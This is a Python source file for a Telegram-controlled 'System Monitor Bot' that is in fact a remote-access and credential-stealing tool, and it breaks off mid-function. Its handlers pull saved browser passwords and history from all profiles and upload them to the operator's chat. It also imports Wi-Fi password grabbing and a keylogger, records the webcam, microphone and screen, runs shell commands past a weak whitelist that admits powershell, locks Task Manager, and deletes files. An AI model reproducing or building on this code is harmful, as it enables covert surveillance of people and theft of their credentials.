"""
V12 - System Monitor Bot

Main entry point with modular architecture

Developer: TsByin
Version: 12.0 (Hardened, Full-Featured & Optimized)
"""

import sys
import os
import time
import threading
import logging
import socket
import platform
import subprocess
import psutil
import io
import tempfile
import requests
from datetime import datetime
from telebot import TeleBot, types

# Allowed shell commands whitelist (B1 - prevent injection)
SHELL_WHITELIST = {
    'dir', 'ipconfig', 'tasklist', 'netstat', 'systeminfo', 'whoami',
    'hostname', 'ping', 'tracert', 'nslookup', 'netsh', 'sc', 'wmic',
    'powershell', 'reg', 'schtasks', 'diskpart', 'chkdsk', 'sfc',
    'driverquery', 'gpresult', 'set', 'date', 'time', 'ver', 'echo',
    'type', 'more', 'find', 'findstr', 'tree', 'attrib', 'icacls',
    'net', 'arp', 'route', 'fc', 'comp', 'xcopy', 'robocopy', 'md',
    'rd', 'del', 'copy', 'move', 'ren', 'cls', 'mode', 'assoc',
}

# Allowed drive roots for file browser (B2 - prevent path traversal)
ALLOWED_ROOTS = [c + ':\\' for c in 'CDEFGHIJKLMNOPQRSTUVWXYZ']
ALLOWED_ROOTS += [os.path.expanduser('~')]

# Import our modules
from config import (
    API_TOKEN, ADMIN_ID, BASE_DIR, BLOCKED_FILE, SETTINGS_FILE,
    BROWSER_PATHS, MAX_WORKERS, logger, AUDIO_AVAILABLE, TTS_AVAILABLE,
    MONITOR_INTERVAL, CPU_ALERT_THRESHOLD, CPU_ALERT_COOLDOWN
)

from utils import (
    load_settings, save_settings, load_blocked_list, save_blocked_list,
    get_active_window_title, find_and_close_window, show_message_box,
    speak_text, get_installed_browsers, set_taskmgr_state, check_integrity,
    protect_folder, load_json_safe, save_json_safe, block_site, unblock_site,
    get_clipboard_contents, refresh_firewall_blocks, append_audit_log
)

from grabber import (
    grab_passwords, grab_history_specific, grab_wifi_passwords, save_wifi_to_file
)

from media import (
    smart_screenshot, capture_webcam, record_audio, record_screen,
    get_media_file_size, cleanup_media_file
)

from monitor import SystemMonitor, BotStats
from keylogger import get_keylogger, PYNPUT_AVAILABLE

# ==============================================================================
# GLOBAL STATE
# ==============================================================================

config = {
    'MONITOR_INTERVAL': MONITOR_INTERVAL,
    'CPU_ALERT_THRESHOLD': CPU_ALERT_THRESHOLD,
    'CPU_ALERT_COOLDOWN': CPU_ALERT_COOLDOWN,
}

AUDIT_FILE = os.path.join(BASE_DIR, "audit.log")

bot = TeleBot(API_TOKEN)
bot_stats = BotStats()
monitor = None
upload_state = {}
active_streams = {}   # chat_id -> threading.Event (stop flag)

# Load data & restore persisted state
BLOCKED_DATA = load_blocked_list(BLOCKED_FILE)
CURRENT_SETTINGS = load_settings(SETTINGS_FILE)

intrusion_alert_active = bool(CURRENT_SETTINGS.get("intrusion_alert", False))
block_mode_active      = bool(CURRENT_SETTINGS.get("block_mode", False))
taskmgr_locked         = bool(CURRENT_SETTINGS.get("taskmgr_locked", False))
clipboard_monitor_on   = bool(CURRENT_SETTINGS.get("clipboard_monitor", False))

logger.info(f"✅ Bot initialized for Admin: {ADMIN_ID}")
logger.info(f"   Restored state — block={block_mode_active} taskmgr={taskmgr_locked} "
            f"intrusion={intrusion_alert_active} clipboard={clipboard_monitor_on}")


def _save_state():
    """Persist toggleable state flags to settings.json"""
    CURRENT_SETTINGS.update({
        "block_mode": block_mode_active,
        "taskmgr_locked": taskmgr_locked,
        "intrusion_alert": intrusion_alert_active,
        "clipboard_monitor": clipboard_monitor_on,
    })
    save_settings(SETTINGS_FILE, CURRENT_SETTINGS)


def audit(cmd, uid=ADMIN_ID):
    """One-liner wrapper to append an audit log entry"""
    append_audit_log(AUDIT_FILE, cmd, uid)

# ==============================================================================
# BOT MENUS
# ==============================================================================

def send_reply_menu(m):
    """Send Reply Keyboard Menu"""
    mk = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    mk.add("🔑 Lấy Passwords", "🌐 Lịch Sử Web")
    mk.add("🖼 Chụp Màn Hình", "📸 Webcam")
    mk.add("🎤 Ghi Âm (10s)", "🎥 Quay MH (10s)")
    mk.add("🚫 Chặn App/Web", "🔒 Khóa TaskMgr")
    mk.add("⚙️ QL Tiến Trình", "🚀 Chạy Lệnh")
    mk.add("🔄 Khởi động lại", "🛑 Tắt máy")
    mk.add("📂 Duyệt File", "🚨 Cảnh Báo (Toggle)")
    mk.add("📶 Wi-Fi", "📋 Clipboard")
    mk.add("📍 Vị Trí IP", "🧱 Khóa Input")
    mk.add("⌨️ Keylogger", "💓 Kiểm Tra Bot")

    bot.send_message(m.chat.id, "🛡️ **CONTROL PANEL V12**\n"
                     "_Dùng lệnh /help để xem tất cả lệnh_",
                     reply_markup=mk, parse_mode="Markdown")



# ==============================================================================
# COMMAND HANDLERS
# ==============================================================================

@bot.message_handler(commands=['start', 'menu'])
def menu_handler(m):
    """Handle /start and /menu commands"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        send_reply_menu(m)
    except Exception as e:
        logger.error(f"menu_handler failed: {e}")

@bot.message_handler(commands=['help'])
def help_handler(m):
    """Help command"""
    if m.from_user.id != ADMIN_ID:
        return
    
    text = (
        "ℹ️ **LỆNH V12:**\n"
        "/status — Bảng trạng thái hệ thống\n"
        "/stats — Thống kê bot\n"
        "/disk — Ổ đĩa & pin\n"
        "/ps [filter] — Tiến trình (có lọc)\n"
        "/net — Snapshot mạng\n"
        "/events — Windows Event Log\n"
        "/stream [N] — Phát màn hình mỗi N giây\n"
        "/stream stop — Dừng stream\n"
        "/record [N] — Quay màn hình Ns (MP4)\n"
        "/audio [N] — Ghi âm Ns\n"
        "/say [--rate N] [--voice f|m] <text>\n"
        "/msg <text> — Hộp thoại\n"
        "/block app|site <tên>\n"
        "/unblock app|site <tên>\n"
        "/kill <pid>\n"
        "/cmd <lệnh shell>\n"
        "/volume [0-100|up|down|max|mute|unmute|status]\n"
        "/cmdlist — Lệnh shell hợp lệ\n"
        "/clipmon — Toggle clipboard monitor\n"
        "/reload — Tải lại .env\n"
        "/stop — Tắt bot + watchdog (không restart)\n"
        "/auditlog [N] — Xem N dòng audit log\n"
        "/help — Trợ giúp"
    )
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

# ==============================================================================
# BOT COMMANDS AUTO-SETUP
# ==============================================================================

def _setup_bot_commands():
    """Register slash-commands in Telegram so they appear in the command menu"""
    try:
        from telebot.types import BotCommand
        cmds = [
            BotCommand("start",    "Hiển thị menu điều khiển"),
            BotCommand("menu",     "Hiển thị menu điều khiển"),
            BotCommand("status",   "Bảng trạng thái hệ thống"),
            BotCommand("stats",    "Thống kê bot"),
            BotCommand("disk",     "Thông tin ổ đĩa & pin"),
            BotCommand("ps",       "Danh sách tiến trình [filter]"),
            BotCommand("net",      "Snapshot mạng"),
            BotCommand("events",   "Windows Event Log (10 mục)"),
            BotCommand("stream",   "Phát màn hình N giây/ảnh"),
            BotCommand("record",   "Quay màn hình tùy chỉnh"),
            BotCommand("audio",    "Ghi âm tùy chỉnh"),
            BotCommand("say",      "TTS nói"),
            BotCommand("msg",      "Hộp thoại thông báo"),
            BotCommand("block",    "Chặn app/web"),
            BotCommand("unblock",  "Gỡ chặn app/web"),
            BotCommand("kill",     "Kết thúc tiến trình"),
            BotCommand("cmd",      "Chạy lệnh shell"),
            BotCommand("volume",   "Âm lượng hệ thống [0-100|up|down|max|mute]"),
            BotCommand("cmdlist",  "Danh sách lệnh shell hợp lệ"),
            BotCommand("reload",   "Tải lại config .env"),
            BotCommand("stop",     "Tắt bot và watchdog hoàn toàn"),
            BotCommand("auditlog", "Xem audit log [N dòng]"),
            BotCommand("help",     "Trợ giúp"),
        ]
        bot.set_my_commands(cmds)
        logger.info(f"✅ Bot commands registered ({len(cmds)} commands)")
    except Exception as e:
        logger.warning(f"_setup_bot_commands failed: {e}")

# ==============================================================================
# STATUS & STATS
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "💓 Kiểm Tra Bot")
@bot.message_handler(commands=['status'])
def check_status(m):
    """Rich /status dashboard"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        s = bot_stats.get_stats()
        # Disk info
        disk_lines = []
        for part in psutil.disk_partitions(all=False):
            try:
                du = psutil.disk_usage(part.mountpoint)
                disk_lines.append(
                    f"  {part.device}: {du.used/1e9:.1f}/{du.total/1e9:.1f}GB "
                    f"({du.percent}%)"
                )
            except Exception:
                pass
        # Battery
        batt = psutil.sensors_battery()
        if batt:
            batt_str = f"{batt.percent:.0f}% {'🔌' if batt.power_plugged else '🔋'}"
        else:
            batt_str = "N/A"
        # Network IO
        nio = psutil.net_io_counters()
        # Local IP
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            local_ip = "?"
        # OS
        os_info = f"{platform.system()} {platform.release()}"

        flags_line = (
            f"Chặn={'✅' if block_mode_active else '❌'}  "
            f"TaskMgr={'🔴' if taskmgr_locked else '🟢'}  "
            f"Xâm={'🟢' if intrusion_alert_active else '❌'}  "
            f"Clip={'🟢' if clipboard_monitor_on else '❌'}"
        )

        msg = (
            f"🖥️ **STATUS DASHBOARD**\n"
            f"🕐 Uptime: {s['uptime']}\n"
            f"💻 Host: {platform.node()} | IP: `{local_ip}`\n"
            f"🖥️ OS: {os_info}\n"
            f"🧠 CPU: {s['cpu']}%  💾 RAM: {s['ram']}%\n"
            f"🔋 Battery: {batt_str}\n"
            f"📤 Net: ↑{nio.bytes_sent/1e6:.1f}MB ↓{nio.bytes_recv/1e6:.1f}MB\n"
            f"⚙️ Processes: {s['process_count']}\n"
            f"📡 Cmds run: {s['commands']}\n"
            f"💿 Disks:\n" + "\n".join(disk_lines) + "\n"
            f"🚩 Flags: {flags_line}"
        )
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
        audit("/status", m.from_user.id)
    except Exception as e:
        logger.error(f"check_status failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(commands=['stats'])
def show_stats(m):
    """Show detailed statistics"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        msg = bot_stats.get_stats_message()
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"show_stats failed: {e}")

@bot.message_handler(commands=['auditlog'])
def cmd_auditlog(m):
    """/auditlog [N] — show last N lines of audit.log (default 20)"""
    if m.from_user.id != ADMIN_ID:
        return
    try:
        parts = m.text.split()
        n = int(parts[1]) if len(parts) > 1 else 20
        n = max(1, min(n, 200))
        if not os.path.exists(AUDIT_FILE):
            bot.reply_to(m, "ℹ️ Chưa có audit log.")
            return
        with open(AUDIT_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        tail = lines[-n:]
        text = "".join(tail)
        if len(text) > 4000:
            text = text[-4000:]
        bot.reply_to(m, f"📋 **Audit Log** (last {len(tail)}):\n```\n{text}\n```",
                     parse_mode="Markdown")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"cmd_auditlog failed: {e}")
        bot.reply_to(m, f"❌ {e}")

# ==============================================================================
# PASSWORD & HISTORY
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🔑 Lấy Passwords")
def h_pass(m):
    """Extract and send passwords from all profiles"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất mật khẩu từ tất cả profiles...")
            outfiles = grab_passwords(BROWSER_PATHS, compress=True, max_workers=MAX_WORKERS)
            
            if outfiles:
                # outfiles is now a list of files
                if not isinstance(outfiles, list):
                    outfiles = [outfiles]
                
                for outfile in outfiles:
                    try:
                        with open(outfile, 'rb') as f:
                            bot.send_document(m.chat.id, f, caption=f"📄 {os.path.basename(outfile)}")
                        cleanup_media_file(outfile)
                        bot_stats.increment_command()
                        logger.info(f"Password file sent: {outfile}")
                    except Exception as e:
                        logger.error(f"Send password file failed: {e}")
                        bot.send_message(m.chat.id, f"❌ Lỗi gửi file: {outfile}")
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy mật khẩu")
        except Exception as e:
            logger.error(f"h_pass failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🌐 Lịch Sử Web")
def h_history_menu(m):
    """History with default limit (500 pages from all browsers & profiles)"""
    if m.from_user.id != ADMIN_ID:
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "⏳ Đang trích xuất lịch sử web (500 trang) từ tất cả profiles...")
            outfiles = grab_history_specific(BROWSER_PATHS, browser_name=None, limit=500)
            
            if outfiles:
                if not isinstance(outfiles, list):
                    outfiles = [outfiles]
                
                for outfile in outfiles:
                    try:
                        with open(outfile, 'rb') as f:
                            bot.send_document(m.chat.id, f, caption=f"📄 {os.path.basename(outfile)}")
                        cleanup_media_file(outfile)
                        bot_stats.increment_command()
                        logger.info(f"History file sent: {outfile}")
                    except Exception as e:
                        logger.error(f"Send history file failed: {e}")
                        bot.send_message(m.chat.id, f"❌ Lỗi gửi file: {outfile}")
            else:
                bot.send_message(m.chat.id, "❌ Không tìm thấy lịch sử web")
        except Exception as e:
            logger.error(f"h_history_menu failed: {e}")
            bot.send_message(m.chat.id, f"❌ Lỗi: {e}")
    
    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# MEDIA CAPTURE
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🖼 Chụp Màn Hình")
def h_scr(m):
    """Screenshot"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        img_data = smart_screenshot()
        if img_data:
            bio = io.BytesIO(img_data)
            bio.name = "screenshot.png"
            bot.send_document(m.chat.id, bio, caption="🖼 Screenshot")
            bot_stats.increment_command()
        else:
            bot.send_message(m.chat.id, "❌ Lỗi chụp màn hình")
    except Exception as e:
        logger.error(f"h_scr failed: {e}")

@bot.message_handler(func=lambda m: m.text == "📸 Webcam")
def h_cam(m):
    """Webcam capture"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        # Temporarily disable intrusion alert if active
        global intrusion_alert_active
        wa = intrusion_alert_active
        if wa:
            intrusion_alert_active = False
            time.sleep(1)
        
        img_data = capture_webcam()
        if img_data:
            bot.send_photo(m.chat.id, img_data)
            bot_stats.increment_command()
        else:
            bot.send_message(m.chat.id, "❌ Lỗi webcam")
        
        if wa:
            intrusion_alert_active = True
    except Exception as e:
        logger.error(f"h_cam failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🎤 Ghi Âm (10s)")
def h_aud(m):
    """Record audio"""
    if m.from_user.id != ADMIN_ID:
        return
    
    if not AUDIO_AVAILABLE:
        bot.send_message(m.chat.id, "❌ Thiếu Audio Driver")
        return
    
    def task():
        try:
            bot.send_message(m.chat.id, "🎙 Ghi âm...")
            if record_audio(10, "rec.wav"):
                with open("rec.wav", 'rb') as f:
                    bot.send_voice(m.chat.id, f)
                cleanup_media_file("rec.wav")
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi ghi âm")
        except Exception as e:
            logger.error(f"h_aud task failed: {e}")
    
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🎥 Quay MH (10s)")
def h_vid(m):
    """Record screen 10s from menu button"""
    if m.from_user.id != ADMIN_ID:
        return
    _do_record_screen(m, 10)

@bot.message_handler(commands=['record'])
def h_vid_custom(m):
    """/record [seconds] — record screen with custom duration (max 120s)"""
    if m.from_user.id != ADMIN_ID:
        return
    parts = m.text.split()
    try:
        secs = max(3, min(120, int(parts[1]))) if len(parts) > 1 else 10
    except ValueError:
        secs = 10
    _do_record_screen(m, secs)

def _do_record_screen(m, secs):
    """Shared screen recording logic — outputs MP4"""
    def task():
        tmp = os.path.join(BASE_DIR, f"screen_{secs}s.mp4")
        try:
            bot.send_message(m.chat.id, f"🎥 Quay màn hình {secs}s (MP4)...")
            ok, actual_file = record_screen(secs, tmp)
            if ok and os.path.exists(actual_file):
                size_mb = os.path.getsize(actual_file) / (1024 * 1024)
                with open(actual_file, 'rb') as f:
                    bot.send_document(m.chat.id, f,
                                      caption=f"🎥 {secs}s | {size_mb:.1f}MB")
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi quay video")
        except Exception as e:
            logger.error(f"record screen task failed: {e}")
        finally:
            cleanup_media_file(tmp)
            # also clean any .avi fallback
            cleanup_media_file(os.path.splitext(tmp)[0] + '.avi')

    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(commands=['audio'])
def h_aud_custom(m):
    """/audio [seconds] — record audio with custom duration (max 120s)"""
    if m.from_user.id != ADMIN_ID:
        return
    if not AUDIO_AVAILABLE:
        bot.reply_to(m, "❌ Thiếu Audio Driver")
        return
    parts = m.text.split()
    try:
        secs = max(3, min(120, int(parts[1]))) if len(parts) > 1 else 10
    except (ValueError, IndexError):
        secs = 10

    def task():
        fname = os.path.join(BASE_DIR, f"rec_{secs}s.wav")
        try:
            bot.send_message(m.chat.id, f"🎙 Ghi âm {secs}s...")
            if record_audio(secs, fname):
                with open(fname, 'rb') as f:
                    bot.send_voice(m.chat.id, f, caption=f"🎙 {secs}s")
                cleanup_media_file(fname)
                bot_stats.increment_command()
            else:
                bot.send_message(m.chat.id, "❌ Lỗi ghi âm")
        except Exception as e:
            logger.error(f"h_aud_custom task failed: {e}")
            cleanup_media_file(fname)

    threading.Thread(target=task, daemon=True).start()

# ==============================================================================
# BLOCKING & CONTROL
# ==============================================================================

@bot.message_handler(func=lambda m: m.text == "🚫 Chặn App/Web")
def toggle_block(m):
    """Toggle blocking mode"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global block_mode_active
        block_mode_active = not block_mode_active
        if monitor:
            monitor.update_flags(block_mode=block_mode_active)
        _save_state()

        # Sync firewall/hosts with new toggle state
        sites = BLOCKED_DATA.get("sites", [])
        if sites:
            if block_mode_active:
                for s in sites:
                    block_site(s)
            else:
                for s in sites:
                    unblock_site(s)

        status = "🟢 BẬT" if block_mode_active else "🔴 TẮT"
        bot.send_message(m.chat.id, f"🛡️ Chế độ Chặn: {status}")
        bot_stats.increment_command()
        audit("toggle_block " + status, m.from_user.id)
        logger.info(f"Block mode toggled: {block_mode_active}")
    except Exception as e:
        logger.error(f"toggle_block failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🔒 Khóa TaskMgr")
def toggle_taskmgr(m):
    """Toggle TaskMgr lock"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global taskmgr_locked
        taskmgr_locked = not taskmgr_locked
        set_taskmgr_state(enable=not taskmgr_locked)
        if monitor:
            monitor.update_flags(taskmgr_locked=taskmgr_locked)
        _save_state()
        status = "🔴 ĐÃ KHÓA" if taskmgr_locked else "🟢 ĐÃ MỞ"
        bot.send_message(m.chat.id, f"🛡️ Task Manager: {status}")
        bot_stats.increment_command()
        audit("toggle_taskmgr " + status, m.from_user.id)
        logger.info(f"TaskMgr locked: {taskmgr_locked}")
    except Exception as e:
        logger.error(f"toggle_taskmgr failed: {e}")

@bot.message_handler(func=lambda m: m.text == "🚨 Cảnh Báo (Toggle)")
def h_alert(m):
    """Toggle intrusion alert"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        global intrusion_alert_active
        intrusion_alert_active = not intrusion_alert_active
        if monitor:
            monitor.update_flags(intrusion_alert=intrusion_alert_active)
        _save_state()
        status = "BẬT" if intrusion_alert_active else "TẮT"
        bot.send_message(m.chat.id, f"🚨 Cảnh báo xâm nhập: {status}")
        bot_stats.increment_command()
        audit("toggle_intrusion " + status, m.from_user.id)
        logger.info(f"Intrusion alert toggled: {intrusion_alert_active}")
    except Exception as e:
        logger.error(f"h_alert failed: {e}")

# ==============================================================================
# FILE BROWSER (Phase 2: paginated + per-item action buttons)
# ==============================================================================

PAGE_SIZE = 6  # items per page

def _is_path_allowed(path):
    """B2: validate path is under an allowed root to prevent traversal"""
    if not path:
        return False
    try:
        abs_path = os.path.realpath(path)
        for root in ALLOWED_ROOTS:
            if abs_path.lower().startswith(root.lower()):
                return True
    except Exception:
        pass
    return False

def list_dir(cid, path, page=0):
    """List directory contents with pagination and per-item action buttons"""
    if not _is_path_allowed(path):
        bot.send_message(cid, "⛔ Đường dẫn không hợp lệ.")
        return

    try:
        all_items = sorted(os.listdir(path))
    except PermissionError:
        bot.send_message(cid, f"🔒 Không có quyền truy cập: {path}")
        return
    except Exception as e:
        bot.send_message(cid, f"❌ Lỗi: {e}")
        return

    total = len(all_items)
    start = page * PAGE_SIZE
    end = min(start + PAGE_SIZE, total)
    page_items = all_items[start:end]
    total_pages = max(1, (total + PAGE_SIZE - 1) // PAGE_SIZE)

    mk = types.InlineKeyboardMarkup(row_width=3)

    # Navigation row
    parent = os.path.dirname(path)
    nav_btns = [types.InlineKeyboardButton("🔙 Lên", callback_data=f"d|{parent}|0")]
    nav_btns.append(types.InlineKeyboardButton(f"📄{page+1}/{total_pages}", callback_data="noop"))
    nav_btns.append(types.InlineKeyboardButton("📤 Upload", callback_data=f"up|{path}"))
    mk.add(*nav_btns)

    # Pagination row
    pag_btns = []
    if page > 0:
        pag_btns.append(types.InlineKeyboardButton("◀️ Trước", callback_data=f"d|{path}|{page-1}"))
    if end < total:
        pag_btns.append(types.InlineKeyboardButton("▶️ Sau", callback_data=f"d|{path}|{page+1}"))
    if pag_btns:
        mk.add(*pag_btns)

    # Per-item rows: each item gets [Name/Open] [⬇] [🗑] buttons
    for item in page_items:
        p = os.path.join(path, item)
        is_dir = os.path.isdir(p)
        icon = "📁" if is_dir else "📄"
        label = item[:20] + "…" if len(item) > 20 else item

        if is_dir:
            mk.add(
                types.InlineKeyboardButton(f"{icon} {label}", callback_data=f"d|{p}|0"),
                types.InlineKeyboardButton("🗑 Xóa", callback_data=f"del|{p}"),
            )
        else:
            # Get file size
            try:
                size = os.path.getsize(p)
                size_str = f"{size//1024}KB" if size >= 1024 else f"{size}B"
            except:
                size_str = "?"
            mk.add(
                types.InlineKeyboardButton(f"{icon} {label} ({size_str})", callback_data=f"f|{p}"),
                types.InlineKeyboardButton("👁 Xem", callback_data=f"peek|{p}"),
                types.InlineKeyboardButton("🗑 Xóa", callback_data=f"del|{p}"),
            )

    bot.send_message(cid, f"📂 `{path}`\n{total} mục | Trang {page+1}/{total_pages}", reply_markup=mk, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📂 Duyệt File")
def h_exp(m):
    """File explorer"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        list_dir(m.chat.id, "C:\\")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"h_exp failed: {e}")

# ==============================================================================
# SYSTEM COMMANDS
# ==============================================================================

@bot.message_handler(commands=['kill'])
def cmd_kill(m):
    """Kill process by PID"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        pid = int(m.text.split()[1])
        psutil.Process(pid).terminate()
        bot.reply_to(m, f"✅ Terminated PID {pid}")
        bot_stats.increment_command()
    except Exception as e:
        logger.error(f"cmd_kill failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(commands=['cmd'])
def run_shell(m):
    """Execute shell command — B1: whitelist checked"""
    if m.from_user.id != ADMIN_ID:
        return
    
    try:
        cmd = m.text[5:].strip()
        if not cmd:
            bot.reply_to(m, "ℹ️ Cú pháp: `/cmd <lệnh>`. Xem /cmdlist", parse_mode="Markdown")
            return
        first_word = cmd.split()[0].lower()
        if first_word not in SHELL_WHITELIST:
            bot.reply_to(m, f"❌ Lệnh `{first_word}` không được phép. Xem /cmdlist",
                         parse_mode="Markdown")
            return
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
        output = result.decode('cp850', errors='ignore')
        
        bot.reply_to(m, f"```\n{output[:4000]}\n```", parse_mode="Markdown")
        bot_stats.increment_command()
        audit(f"/cmd {first_word}", m.from_user.id)
    except Exception as e:
        logger.error(f"run_shell failed: {e}")
        bot.reply_to(m, f"❌ Error: {e}")

@bot.message_handler(func=lambda m: m.text == "⚙️ QL Tiến Trình")
def h_proc(m):
    """Show top processes"""
    if m.from_user.id != ADMIN_ID:
        return
    _do_ps(m, filter_str=None)

@bot.message_handler(commands=['ps'])
def cmd_ps(m):
    """/ps [filter] — list processes, optionally filtered by name"""
    if m.from_user.id != ADMIN_ID:
        return
    parts = m.text.split(maxsplit=1)
    f = parts[1].lower().strip() if len(parts) > 1 else None
    _do_ps(m, filter_str=f)

def _do_ps(m, filter_str=None):
    """Shared process list logic with optional name filter"""
    try:
        procs = [p.info for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent'])]
        if filter_str:
            procs = [p for p in procs if filter_str in (p.get('name') or '').lower()]
        procs.sort(key=lambda x: x.get('cpu_percent') or 0, reverse=True)
        procs = procs[:20]

        if not procs:
            bot.send_message(m.chat.id, f"ℹ️ Không tìm thấy tiến trình nào khớp: `{filter_str}`",
                             parse_mode="Markdown")
            return

        header = f"⚙️ **{'TOP 20' if not filter_str else 'Lọc: ' + filter_str.upper()} PROCESS**\n"
        lines = [
            f"`{p['pid']:6}` {(p.get('name') or '?')[:25]:25} "
            f"CPU {p.get('cpu_percent',0):4.1f}%  RAM {p.get('memory_percent',0):.1f}%"
            for p in procs
        ]
        msg = header + "\n".join(lines) + "\n\n/kill <pid>"
        if len(msg) > 4000:
            msg = msg[:4000]
        bot.send_message(m.chat.id, msg, parse_mode="Markdown")
        bot_stats.increment_command()
        audit(f"/ps {filter_str or ''}", m.from_user.id)
    except Exception as e:
        logger.error(f"_do_ps failed: {e}")

@bot.message_handler(commands=['disk'])
def cmd_disk(m):
    """/disk — detailed disk usage + battery info"""
    if m.from_user.id != ADMIN_ID:
        return
    try:
        lines = ["💿 **Disk Usage:**"]
        for part in psutil.disk_partitions(all=False):
            try:
                du = psutil.disk_usage(part.mountpoint)
                bar_filled = int(du.percent / 5)
                bar = "█" * bar_filled + "░" * (20 - bar_filled)
                lines.append(
                    f"`{part.device}` [{bar}] {du.percent}%\n"
                    f"  Đã dùng: {du.used/1e9:.2f}GB / {du.total/1e9:.2f}GB  "
                    f"Còn: {du.free/1e9:.2f}GB\n"
                    f"  FS: {part.fstype}"
                )
            except PermissionError:
                lines.append(f"`{part.device}` — không truy cập được")

        batt = psutil.sensors_battery()
        lines.append("\n🔋 **Battery:**")
        if batt:
            charging = "🔌 Đang sạc" if batt.power_plugged else "🔋 Dùng pin"
            secs_left = batt.secsleft
            if secs_left == psutil.POWER_TIME_UNLIMITED:
                time_str = "AC (không giới hạn)"
            elif secs_left == psutil.POWER_TIME_UNKNOWN or secs_left < 0:
                time_str = "N/A"
            else:
                h, rem = divmod(secs_left, 3600)
                time_str = f"{h}h {rem//60}m còn lại"
            lines.append(f"  {charging}  {batt.percent:.0f}%  ⏱ {time_str}")
        else:
            lines.append("  Không có pin (desktop hoặc lỗi API)")

        bot.send_message(m.chat.id, "\n".join(lines), parse_mode="Markdown")
        bot_stats.increment_command()
        audit("/disk", m.from_user.id)
    except Exception as e:
        logger.error(f"cmd_disk failed: {e}")
        bot.reply_to(m, f"❌ {e}")

@bot.message_handler(commands=['net'])
def cmd_net(m):
    """/net — network snapshot: interfaces, IO, active TCP connections"""
    if m.from_user.id != ADMIN_ID:
        return
    try:
        # Interface addresses
        lines = ["🌐 **Network Snapshot:**\n**Interfaces:**"]
        addrs = psutil.net_if_addrs()
        for iface, addr_list in list(addrs.items())[:8]:
            ipv4 = [a.address for a in addr_list if a.family.name == 'AF_INET']
            if ipv4:
                lines.append(f"  `{iface}`: {', '.join(ipv4)}")

        # IO counters
        nio = psutil.net_io_counters()
        lines.append(
            f"\n**I/O:** ↑{nio.bytes_sent/1e6:.1f}MB  ↓{nio.bytes_recv/1e6:.1f}MB  "
            f"Pkts ↑{nio.packets_sent}  ↓{nio.packets_recv}"
        )

        # Active TCP connections (ESTABLISHED only, first 15)
        lines.append("\n**TCP Connections (ESTABLISHED):**")
        conns = [c for c in psutil.net_connections(kind='tcp') if c.status == 'ESTABLISHED']
        conns.sort(key=lambda c: c.raddr.port if c.raddr else 0)
        for c in conns[:15]:
            raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else "?"
            try:
                proc_name = psutil.Process(c.pid).name() if c.pid else "?"
            except Exception:
                proc_name = "?"
            lines.append(f"  {raddr}  [{proc_name}]")
        if not conns:
            lines.append("  (không có)")

        bot.send_message(m.chat.id, "\n".join(lines), parse_mode="Markdown")
        bot_stats.increment_command()
        audit("/net", m.from_user.id)
    except Exception as e:
        logger.error(f"cmd_net failed: {e}")
        bot.reply_to(m, f"❌ {e}")

@bot.message_handler(commands=['events'])
def cmd_events(m):
    """/events — last 10 Windows System Event Log entries"""
    if m.from_user.id != ADMIN_ID:
        return
    def task():
        try:
            result = subprocess.run(
                ["wevtutil", "qe", "System", "/c:10", "/rd:true", "/f:text"],
                capture_output=True, text=True, timeout=15,
                encoding='utf-8', errors='ignore',
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            out = result.stdout.strip()
            if not out:
                bot.send_message(m.chat.id, "ℹ️ Không lấy được event log.")
                return
            # Trim to Telegram limit
            if len(out) > 3800:
                out = out[:3800] + "\n... (truncated)"
            bot.send_message(m.chat.id,
                             f"📋 **Windows System Events (10 mới nhất):**\n```\n{out}\n```",
                             parse_mode="Markdown")
            bot_stats.increment_command()
            audit("/events", m.from_user.id)
        except subprocess.TimeoutExpired:
            bot.send_message(m.chat.id, "⏱ Timeout khi đọc event log")
        except Exception as e:
            logger.error(f"cmd_events failed: {e}")
            bot.send_message(m.chat.id, f"❌ {e}")
    threading.Thread(target=task, daemon=True).start()

@bot.message_handler(func=lambda m: m.text == "🚀 Chạy Lệnh")
def h_cmd(m):
